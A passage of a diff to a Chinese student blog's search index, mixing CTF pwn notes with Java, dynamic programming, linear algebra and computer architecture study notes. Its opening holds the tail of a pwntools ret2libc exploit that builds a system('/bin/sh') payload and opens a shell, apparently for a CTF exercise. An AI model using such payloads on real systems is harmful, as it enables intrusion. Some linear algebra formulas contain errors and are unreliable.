class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h4 id="关于空格，空行的方法"><a href="#关于空格，空行的方法" class="headerlink" title="关于空格，空行的方法"></a>关于空格，空行的方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(i+<span class="string">&quot;\t&quot;</span>)<span class="comment">//数据之间的空格操作</span></span><br><span class="line">System.out.println()<span class="comment">//数据的空行操作</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="案例小练习：猜数字"><a href="#案例小练习：猜数字" class="headerlink" title="案例小练习：猜数字"></a>案例小练习：猜数字</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> guessnumber;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">func</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        Random r=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> num=r.nextInt(<span class="number">100</span>)+<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;已随机生成1-100的数字\n&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你猜的数字\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> input=sc.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(input&gt;num) System.out.println(<span class="string">&quot;你猜的数字过大&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(input&lt;num) System.out.println(<span class="string">&quot;你猜的数字过小&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;正确！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] ages=<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;<span class="comment">//静态初始化</span></span><br><span class="line"><span class="type">int</span>[]=&#123;input&#125;<span class="comment">//动态初始化</span></span><br><span class="line">System.out.println(ages.length)<span class="comment">//求数组长度</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h4><p>同一个类，出现多个方法名称相同，形参列表不同这些方法叫重载方法。</p>
-<p>p.s. 返回值类型没关系</p>
-<p>如：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">void</span><span class="params">()</span>&#123;</span><br><span class="line">	代码段<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">void</span><span class="params">(String a)</span></span><br><span class="line">&#123;</span><br><span class="line">	代码段<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="return单独使用"><a href="#return单独使用" class="headerlink" title="return单独使用"></a>return单独使用</h4><p>单写一个return，</p>
-<p>可以跳出并立即结束所在方法的执行</p>
-<h4 id="生成随机字符"><a href="#生成随机字符" class="headerlink" title="生成随机字符"></a>生成随机字符</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char ch=(char) (ra.nextInt(26)+65);//生成随机大写字母</span><br><span class="line">char ch2=(char) (ra.nextInt(26)+97);//生成随机小写字母</span><br></pre></td></tr></table></figure>
-
-<h4 id="String类常用api"><a href="#String类常用api" class="headerlink" title="String类常用api"></a>String类常用api</h4><p><strong>判断相等</strong>：在java中字符串内容比较不能使用”==”，因为java字符串表示的是地址。。</p>
-<p>如：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string name=<span class="string">&quot;zrm&quot;</span>;</span><br><span class="line">string password=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">string in_name,in_password;</span><br><span class="line">cin&gt;&gt;in_name&gt;&gt;in_password;</span><br><span class="line"><span class="keyword">if</span>(in_name==name&amp;&amp;in_password==password) cout&lt;&lt;<span class="string">&quot;正确&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;错误&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>这一段C++代码是可以执行的，但是放在java中即使输入相同的名字密码都无法输出“正确”，因为定义的正确字符串存于常量区，而输入的字符串在堆内存中，两者的地址不一样，比较的结果是不相等。</p>
-<p>因此需要用到一个判断内容相等的api：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String name=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">String password=<span class="string">&quot;123456&quot;</span>；</span><br><span class="line">Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in)</span><br><span class="line"><span class="comment">//定义接受输入内容的对象....</span></span><br><span class="line">name.equal(in_name)<span class="comment">//判断name字符串和in_name字符串内容是否相等，包括大小写检验</span></span><br><span class="line">password.equalIgnoreCase(in_password)<span class="comment">//判断前后是否相等，忽略大小写</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>对字符串的操作</strong>:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str=<span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">str.length();<span class="comment">//求字符串长度</span></span><br><span class="line">str.charAt(<span class="type">int</span> num);<span class="comment">//求字符串特定位置字符</span></span><br><span class="line">str.toCharArray();<span class="comment">//把字符串转成字符数组</span></span><br><span class="line">str.substring(<span class="type">int</span> first,<span class="type">int</span> last);<span class="comment">//截取，包前不包后</span></span><br><span class="line">str.substring(<span class="type">int</span> first);<span class="comment">//截取，从当前索引一直截取到末尾</span></span><br><span class="line">str.replace(String before,String <span class="keyword">new</span>);<span class="comment">//替换，把前一个内容全部替换成后一个内容</span></span><br><span class="line">str.contain(String s);<span class="comment">//判断是否包含，是返回true,否则返回false</span></span><br><span class="line">str.startsWith(String str);<span class="comment">//判断是否以此字符串开始</span></span><br><span class="line">String str2=<span class="string">&quot;aaa,bbb,ccc&quot;</span>;</span><br><span class="line">str.split(<span class="string">&quot;,&quot;</span>);<span class="comment">//按照&quot;,&quot;分开，返回字符串数组，需要有一个字符串数组对象接收返回值</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="生成验证码第二种表达方式"><a href="#生成验证码第二种表达方式" class="headerlink" title="生成验证码第二种表达方式"></a>生成验证码第二种表达方式</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">special_number</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String str=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">        Random ra=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        String res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> num=ra.nextInt(str.length());</span><br><span class="line">            <span class="type">char</span> c=str.charAt(num);</span><br><span class="line">            res+=c;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="ArrayList类"><a href="#ArrayList类" class="headerlink" title="ArrayList类"></a>ArrayList类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();<span class="comment">//尖括号内约束数据类型</span></span><br><span class="line">list.add();<span class="comment">//直接添加</span></span><br><span class="line">list.add(<span class="type">int</span> index,type data);<span class="comment">//在指定位置插入元素</span></span><br><span class="line">list.get(<span class="type">int</span> index);<span class="comment">//获得指定位置元素</span></span><br><span class="line">list.size();<span class="comment">//获得元素个数</span></span><br><span class="line">list.remove(<span class="type">int</span> index);<span class="comment">//删除索引位置元素，返回被删除的元素值</span></span><br><span class="line">list.remove(Object o);<span class="comment">//删除容器内元素的值，如有多个相同值则删除第一个</span></span><br><span class="line">list.set(<span class="type">int</span> index,E element);<span class="comment">//修改索引位置的元素为后面的元素</span></span><br></pre></td></tr></table></figure>
-
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
+<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
+<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg"></p>
 ]]></content>
       <tags>
-        <tag>Java</tag>
-        <tag>语法</tag>
+        <tag>pwn</tag>
+        <tag>基础</tag>
       </tags>
   </entry>
   <entry>
-    <title>基础算法02</title>
-    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
-    <content><![CDATA[<p> dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
+    <title>线代预习一些知识</title>
+    <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<p> 这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
 <span id="more"></span>
 
-<h4 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h4><p>先来看一道很简单的例题：</p>
-<p>出自洛谷p1216</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%95%B0%E5%AD%97%E9%87%91%E5%AD%97%E5%A1%94.png"></p>
-<p>具体要求如下：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%95%B0%E5%AD%97%E9%87%91%E5%AD%97%E5%A1%94%E5%85%B7%E4%BD%93%E8%A6%81%E6%B1%82.png"></p>
-<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
-<p>核心代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>ac代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<ul>
+<li><p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
+</li>
+<li><p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
+</li>
+<li><p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
+<h4 id="施密特正交化步骤："><a href="#施密特正交化步骤：" class="headerlink" title="施密特正交化步骤："></a>施密特正交化步骤：</h4></li>
+<li><p><strong>&lt;1&gt;.</strong>   $ A=a $</p>
+</li>
+<li><p><strong>&lt;2&gt;.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$ </p>
+</li>
+<li><p><strong>&lt;3&gt;.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}*A-\frac{B\tau*c}{B\tau*b}*B $</p>
+<h3 id="一些关于行列式的性质："><a href="#一些关于行列式的性质：" class="headerlink" title="一些关于行列式的性质："></a>一些关于行列式的性质：</h3></li>
+</ul>
+<p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
+<ol>
+<li><p>$$|2*A|=2^n*x$$</p>
+</li>
+<li><p>$$|-A|=(-1)^n*x$$</p>
+</li>
+<li><p>$$|A^2|=x^2$$</p>
+</li>
+<li><p>$$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$$</p>
+</li>
+</ol>
+<p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
+<p>矩阵可逆可推出列空间是$R^3$</p>
+<p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
+<p>列空间的维数是他的秩</p>
+<p>零空间的维数是自由列的数量(列数-秩的数量)</p>
+<h4 id="克雷默法则"><a href="#克雷默法则" class="headerlink" title="克雷默法则"></a>克雷默法则</h4><p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
+<h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><p>$$A^-1=\frac{C\tau}{|A|}$$</p>
+<p>$$A*C\tau=|A|*I$$</p>
+<h4 id="特征值与特征向量"><a href="#特征值与特征向量" class="headerlink" title="特征值与特征向量"></a>特征值与特征向量</h4><p>特征值的和=矩阵左上右下对角线的和</p>
+<p>特征值的乘积等于矩阵的行列式</p>
+<h4 id="对角化"><a href="#对角化" class="headerlink" title="对角化"></a>对角化</h4><p>$$\Lambda$$是特征值依次排列下来的矩阵，只有对角线有元素</p>
+<p>X则是特征向量的集合的矩阵</p>
+<p>A是原矩阵</p>
+<p>有公式：</p>
+<p>$$\Lambda=X^-1*A*X$$ </p>
+<p>$$A=X^-1*\Lambda*X$$ </p>
 ]]></content>
       <categories>
-        <category>算法</category>
+        <category>大一课程</category>
       </categories>
       <tags>
-        <tag>算法</tag>
-        <tag>C++</tag>
+        <tag>线性代数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计算机体系结构复习</title>
+    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<p> 大一下预习计算机体系结构</p>
+<span id="more"></span>
+
+<h4 id="原码反码补码"><a href="#原码反码补码" class="headerlink" title="原码反码补码"></a>原码反码补码</h4><ul>
+<li>原码：二进制形式</li>
+<li>反码：原码除符号位不变，其余全部取反</li>
+<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
+</ul>
+<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
+]]></content>
+      <categories>
+        <category>大一课程</category>
+      </categories>
+      <tags>
+        <tag>计算机原理</tag>
       </tags>
   </entry>
   <entry>
@@ -359,23 +408,30 @@
       </tags>
   </entry>
   <entry>
-    <title>计算机体系结构复习</title>
-    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<p> 大一下预习计算机体系结构</p>
+    <title>基础算法02</title>
+    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
+    <content><![CDATA[<p> dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
 <span id="more"></span>
 
-<h4 id="原码反码补码"><a href="#原码反码补码" class="headerlink" title="原码反码补码"></a>原码反码补码</h4><ul>
-<li>原码：二进制形式</li>
-<li>反码：原码除符号位不变，其余全部取反</li>
-<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
-</ul>
-<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
+<h4 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h4><p>先来看一道很简单的例题：</p>
+<p>出自洛谷p1216</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%95%B0%E5%AD%97%E9%87%91%E5%AD%97%E5%A1%94.png"></p>
+<p>具体要求如下：</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%95%B0%E5%AD%97%E9%87%91%E5%AD%97%E5%A1%94%E5%85%B7%E4%BD%93%E8%A6%81%E6%B1%82.png"></p>
+<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
+<p>核心代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ac代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
-        <category>大一课程</category>
+        <category>算法</category>
       </categories>
       <tags>
-        <tag>计算机原理</tag>
+        <tag>算法</tag>
+        <tag>C++</tag>
       </tags>
   </entry>
   <entry>
@@ -562,60 +618,5 @@
 <li>经验教训总结，包含<strong>进度</strong>，<strong>成本</strong>，<strong>风险</strong>，<strong>质量</strong>和<strong>客户满意度</strong>五个方面</li>
 </ol>
 ]]></content>
-  </entry>
-  <entry>
-    <title>线代预习一些知识</title>
-    <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<p> 这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
-<span id="more"></span>
-
-<ul>
-<li><p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
-</li>
-<li><p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
-</li>
-<li><p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
-<h4 id="施密特正交化步骤："><a href="#施密特正交化步骤：" class="headerlink" title="施密特正交化步骤："></a>施密特正交化步骤：</h4></li>
-<li><p><strong>&lt;1&gt;.</strong>   $ A=a $</p>
-</li>
-<li><p><strong>&lt;2&gt;.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$ </p>
-</li>
-<li><p><strong>&lt;3&gt;.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}*A-\frac{B\tau*c}{B\tau*b}*B $</p>
-<h3 id="一些关于行列式的性质："><a href="#一些关于行列式的性质：" class="headerlink" title="一些关于行列式的性质："></a>一些关于行列式的性质：</h3></li>
-</ul>
-<p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
-<ol>
-<li><p>$$|2*A|=2^n*x$$</p>
-</li>
-<li><p>$$|-A|=(-1)^n*x$$</p>
-</li>
-<li><p>$$|A^2|=x^2$$</p>
-</li>
-<li><p>$$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$$</p>
-</li>
-</ol>
-<p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
-<p>矩阵可逆可推出列空间是$R^3$</p>
-<p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
-<p>列空间的维数是他的秩</p>
-<p>零空间的维数是自由列的数量(列数-秩的数量)</p>
-<h4 id="克雷默法则"><a href="#克雷默法则" class="headerlink" title="克雷默法则"></a>克雷默法则</h4><p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
-<h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><p>$$A^-1=\frac{C\tau}{|A|}$$</p>
-<p>$$A*C\tau=|A|*I$$</p>
-<h4 id="特征值与特征向量"><a href="#特征值与特征向量" class="headerlink" title="特征值与特征向量"></a>特征值与特征向量</h4><p>特征值的和=矩阵左上右下对角线的和</p>
-<p>特征值的乘积等于矩阵的行列式</p>
-<h4 id="对角化"><a href="#对角化" class="headerlink" title="对角化"></a>对角化</h4><p>$$\Lambda$$是特征值依次排列下来的矩阵，只有对角线有元素</p>
-<p>X则是特征向量的集合的矩阵</p>
-<p>A是原矩阵</p>
-<p>有公式：</p>
-<p>$$\Lambda=X^-1*A*X$$ </p>
-<p>$$A=X^-1*\Lambda*X$$ </p>
-]]></content>
-      <categories>
-        <category>大一课程</category>
-      </categories>
-      <tags>
-        <tag>线性代数</tag>
-      </tags>
   </entry>
 </search>
